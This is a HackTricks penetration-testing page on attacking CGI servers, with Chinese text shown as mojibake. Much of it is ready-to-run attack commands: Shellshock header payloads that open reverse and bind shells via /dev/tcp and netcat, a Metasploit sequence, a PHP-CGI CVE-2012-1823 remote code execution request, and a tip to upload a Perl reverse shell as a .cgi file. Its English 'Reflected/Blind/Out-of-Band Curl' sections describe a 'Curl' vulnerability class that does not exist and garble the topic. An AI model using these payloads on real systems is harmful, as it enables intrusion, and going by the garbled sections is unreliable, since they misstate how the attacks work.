<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# ä¿¡æ¯

**CGIè„šæœ¬æ˜¯perlè„šæœ¬**ï¼Œæ‰€ä»¥ï¼Œå¦‚æœä½ å·²ç»å…¥ä¾µäº†ä¸€ä¸ªå¯ä»¥æ‰§è¡Œ_**.cgi**_è„šæœ¬çš„æœåŠ¡å™¨ï¼Œä½ å¯ä»¥**ä¸Šä¼ ä¸€ä¸ªperlåå‘shell**ï¼ˆ`/usr/share/webshells/perl/perl-reverse-shell.pl`ï¼‰ï¼Œ**å°†æ‰©å±•å**ä»**.pl**æ”¹ä¸º**.cgi**ï¼Œç»™äºˆ**æ‰§è¡Œæƒé™**ï¼ˆ`chmod +x`ï¼‰å¹¶ä¸”**é€šè¿‡webæµè§ˆå™¨è®¿é—®**åå‘shellæ¥æ‰§è¡Œå®ƒã€‚
ä¸ºäº†æµ‹è¯•**CGIæ¼æ´**ï¼Œå»ºè®®ä½¿ç”¨`nikto -C all`ï¼ˆä»¥åŠæ‰€æœ‰æ’ä»¶ï¼‰

# **ShellShock**

Bashä¹Ÿå¯ä»¥ç”¨äºè¿è¡Œåº”ç”¨ç¨‹åºä¼ é€’ç»™å®ƒçš„å‘½ä»¤ï¼Œæ­£æ˜¯è¿™ä¸ªåŠŸèƒ½å—åˆ°äº†æ¼æ´çš„å½±å“ã€‚å¯ä»¥å‘é€ç»™Bashçš„ä¸€ç§å‘½ä»¤ç±»å‹å…è®¸è®¾ç½®ç¯å¢ƒå˜é‡ã€‚ç¯å¢ƒå˜é‡æ˜¯åŠ¨æ€çš„ã€å‘½åçš„å€¼ï¼Œå½±å“è®¡ç®—æœºä¸Šè¿è¡Œçš„è¿›ç¨‹çš„æ–¹å¼ã€‚æ¼æ´åœ¨äº**æ”»å‡»è€…å¯ä»¥å°†æ¶æ„ä»£ç é™„åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œåœ¨æ¥æ”¶åˆ°å˜é‡åè¿è¡Œè¯¥ä»£ç **ã€‚

åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œ**é¡µé¢å¯èƒ½ä¼šæŠ›å‡ºé”™è¯¯**ã€‚

ä½ å¯ä»¥é€šè¿‡æ³¨æ„åˆ°å®ƒä½¿ç”¨äº†**æ—§ç‰ˆæœ¬çš„Apache**å’Œ**cgi_mod**ï¼ˆå¸¦æœ‰cgiæ–‡ä»¶å¤¹ï¼‰æˆ–ä½¿ç”¨**nikto**æ¥**å‘ç°**è¿™ä¸ªæ¼æ´ã€‚

## **æµ‹è¯•**

å¤§å¤šæ•°æµ‹è¯•éƒ½æ˜¯åŸºäºè¾“å‡ºä¸€äº›å†…å®¹ï¼Œå¹¶æœŸæœ›è¯¥å­—ç¬¦ä¸²åœ¨webå“åº”ä¸­è¿”å›ã€‚å¦‚æœä½ è®¤ä¸ºä¸€ä¸ªé¡µé¢å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œè¯·æœç´¢æ‰€æœ‰çš„cgié¡µé¢å¹¶å¯¹å®ƒä»¬è¿›è¡Œæµ‹è¯•ã€‚

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curlï¼ˆåå°„å‹ã€ç›²æ³¨å’Œå¸¦å¤–ï¼‰**

---

### **Reflected Curl**

#### **Description**

Reflected Curl is a technique used to exploit web applications that reflect user-supplied input in the response. This vulnerability occurs when the application takes user input and includes it in the response without proper sanitization or validation. An attacker can craft a malicious request that includes Curl commands as input, which are then executed by the server and the output is reflected back in the response.

#### **Exploitation**

To exploit this vulnerability, an attacker can send a specially crafted request to the target web application, including Curl commands as input. The server will execute these commands and include the output in the response. The attacker can then analyze the response to gather sensitive information or perform further attacks.

#### **Mitigation**

To mitigate the risk of reflected Curl attacks, it is important to properly sanitize and validate user input before including it in the response. This can be done by implementing input validation and output encoding techniques, such as using secure coding practices and frameworks that automatically handle input sanitization.

---

### **Blind Curl**

#### **Description**

Blind Curl is a technique used to exploit web applications that do not directly reflect user-supplied input in the response, but still execute Curl commands based on that input. This vulnerability occurs when the application takes user input and uses it to construct Curl commands that are executed by the server without directly reflecting the output in the response.

#### **Exploitation**

To exploit this vulnerability, an attacker needs to find a way to infer the output of the executed Curl commands indirectly. This can be done by observing the behavior of the application, such as the response time or the presence of certain error messages. By carefully crafting input, the attacker can manipulate the behavior of the application and gather information about the executed Curl commands.

#### **Mitigation**

To mitigate the risk of blind Curl attacks, it is important to carefully review and validate the construction of Curl commands based on user input. Additionally, implementing proper error handling and logging mechanisms can help detect and prevent blind Curl vulnerabilities.

---

### **Out-of-Band Curl**

#### **Description**

Out-of-Band Curl is a technique used to exploit web applications by leveraging external communication channels to retrieve the output of executed Curl commands. This vulnerability occurs when the application executes Curl commands that trigger external requests to a controlled server, allowing the attacker to capture the output through this communication channel.

#### **Exploitation**

To exploit this vulnerability, an attacker needs to set up a controlled server that can receive the external requests triggered by the executed Curl commands. By crafting malicious input that includes Curl commands, the attacker can make the application send requests to the controlled server, which captures the output and allows the attacker to gather sensitive information.

#### **Mitigation**

To mitigate the risk of out-of-band Curl attacks, it is important to carefully review and validate the execution of Curl commands within the application. Additionally, implementing proper input validation and output encoding techniques can help prevent the inclusion of malicious Curl commands in user input.
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## æ”»å‡»åˆ©ç”¨

Exploiting vulnerabilities in CGI scripts is a common technique used in web application penetration testing. CGI (Common Gateway Interface) is a protocol that allows web servers to execute scripts and generate dynamic content. By exploiting vulnerabilities in CGI scripts, an attacker can gain unauthorized access to the server or execute arbitrary code.

### Remote Command Execution

Remote Command Execution (RCE) is a type of vulnerability that allows an attacker to execute arbitrary commands on the target server. In the context of CGI scripts, RCE vulnerabilities can be exploited by injecting malicious commands into user input fields or by manipulating the parameters passed to the script.

To exploit an RCE vulnerability in a CGI script, an attacker needs to identify the input fields or parameters that are vulnerable to command injection. Once identified, the attacker can craft a payload that includes the malicious command and submit it to the server. If the vulnerability is successfully exploited, the server will execute the injected command and return the output to the attacker.

### File Inclusion

File Inclusion vulnerabilities occur when a CGI script includes external files without proper validation. This can allow an attacker to include arbitrary files from the server's file system, potentially exposing sensitive information or executing malicious code.

To exploit a File Inclusion vulnerability in a CGI script, an attacker needs to identify the vulnerable inclusion point and provide a path to the file they want to include. This can be done by manipulating the parameters passed to the script or by exploiting other vulnerabilities to gain control over the file inclusion process.

Once the File Inclusion vulnerability is successfully exploited, the attacker can read sensitive files, such as configuration files or user credentials, or execute arbitrary code by including a malicious file.

### Directory Traversal

Directory Traversal vulnerabilities occur when a CGI script does not properly sanitize user input, allowing an attacker to navigate outside of the intended directory structure and access files or directories that should be restricted.

To exploit a Directory Traversal vulnerability in a CGI script, an attacker needs to identify the input fields or parameters that are vulnerable to directory traversal attacks. By manipulating these inputs, the attacker can navigate to directories outside of the intended scope and access sensitive files or directories.

Once the Directory Traversal vulnerability is successfully exploited, the attacker can read or modify files, upload malicious files, or gain unauthorized access to restricted areas of the server.

### Code Injection

Code Injection vulnerabilities occur when a CGI script does not properly validate or sanitize user input, allowing an attacker to inject and execute arbitrary code on the server.

To exploit a Code Injection vulnerability in a CGI script, an attacker needs to identify the input fields or parameters that are vulnerable to code injection. By injecting malicious code into these inputs, the attacker can trick the server into executing the injected code.

Once the Code Injection vulnerability is successfully exploited, the attacker can execute arbitrary commands, gain unauthorized access to the server, or perform other malicious activities.

### Conclusion

Exploiting vulnerabilities in CGI scripts can provide attackers with unauthorized access to servers or the ability to execute arbitrary code. It is important for web application developers and administrators to properly validate and sanitize user input to prevent these types of vulnerabilities. Regular security assessments and penetration testing can help identify and mitigate these risks.
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **ä»£ç†ï¼ˆä¸­é—´äººæ”»å‡»åˆ°WebæœåŠ¡å™¨è¯·æ±‚ï¼‰**

CGIä¸ºæ¯ä¸ªHTTPè¯·æ±‚çš„å¤´éƒ¨åˆ›å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ä¾‹å¦‚ï¼š"host:web.com"è¢«åˆ›å»ºä¸º"HTTP\_HOST"="web.com"

ç”±äºWebæœåŠ¡å™¨å¯èƒ½ä½¿ç”¨HTTP\_PROXYå˜é‡ï¼Œå°è¯•å‘é€ä¸€ä¸ªåŒ…å«ï¼š "**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**"çš„å¤´éƒ¨ã€‚å¦‚æœæœåŠ¡å™¨åœ¨ä¼šè¯æœŸé—´æ‰§è¡Œä»»ä½•è¯·æ±‚ï¼Œæ‚¨å°†èƒ½å¤Ÿæ•è·æœåŠ¡å™¨å‘å‡ºçš„æ¯ä¸ªè¯·æ±‚ã€‚

# æ—§ç‰ˆPHP + CGI = RCEï¼ˆCVE-2012-1823ï¼ŒCVE-2012-2311ï¼‰

åŸºæœ¬ä¸Šï¼Œå¦‚æœcgiå¤„äºæ´»åŠ¨çŠ¶æ€ä¸”phpæ˜¯â€œæ—§çš„â€ï¼ˆ&lt;5.3.12 / &lt; 5.4.2ï¼‰ï¼Œåˆ™å¯ä»¥æ‰§è¡Œä»£ç ã€‚
ä¸ºäº†åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ‚¨éœ€è¦è®¿é—®WebæœåŠ¡å™¨çš„æŸä¸ªPHPæ–‡ä»¶ï¼Œè€Œæ— éœ€å‘é€å‚æ•°ï¼ˆç‰¹åˆ«æ˜¯ä¸å‘é€å­—ç¬¦â€œ=â€ï¼‰ã€‚
ç„¶åï¼Œä¸ºäº†æµ‹è¯•æ­¤æ¼æ´ï¼Œæ‚¨å¯ä»¥è®¿é—®ä¾‹å¦‚`/index.php?-s`ï¼ˆæ³¨æ„`-s`ï¼‰ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºçš„**æºä»£ç å°†å‡ºç°åœ¨å“åº”ä¸­**ã€‚

ç„¶åï¼Œä¸ºäº†è·å¾—**RCE**ï¼Œæ‚¨å¯ä»¥å‘é€æ­¤ç‰¹æ®ŠæŸ¥è¯¢ï¼š`/?-d allow_url_include=1 -d auto_prepend_file=php://input`ï¼Œå¹¶å°†è¦åœ¨**è¯·æ±‚çš„æ­£æ–‡ä¸­æ‰§è¡Œçš„PHPä»£ç **ã€‚ç¤ºä¾‹ï¼š
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**æœ‰å…³æ¼æ´å’Œå¯èƒ½çš„åˆ©ç”¨çš„æ›´å¤šä¿¡æ¯ï¼š**[**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**ï¼Œ**[**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**ï¼Œ**[**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**ï¼Œ**[**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTricksçš„è¡£ç‰©**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
